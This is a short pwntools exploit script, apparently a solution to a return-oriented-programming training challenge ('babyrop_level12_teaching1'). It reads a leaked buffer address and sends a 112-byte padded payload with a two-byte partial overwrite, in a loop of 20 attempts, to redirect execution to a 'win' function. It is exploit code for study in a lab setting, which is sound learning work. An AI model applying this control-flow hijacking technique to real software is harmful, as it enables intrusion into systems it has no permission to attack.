#!/usr/bin/python3
from pwn import *
context.clear(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
context.binary = exe = 'babyrop_level12_teaching1'
e = ELF(exe)
# r = ROP(exe)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#p = gdb.debug(['./babyrop_level10_testing1'])
# we can use partial overwrite to bruteforce the address of win
for i in range(20):
	p = process(exe)
	p.recvuntil(b'at: ')
	x = int(p.recvline()[:-2], 16)
	log.info('Buffer @ '+hex(x))
	payload = p16(0x55e3)
	p.send(fit({112:payload}))
	p.interactive()
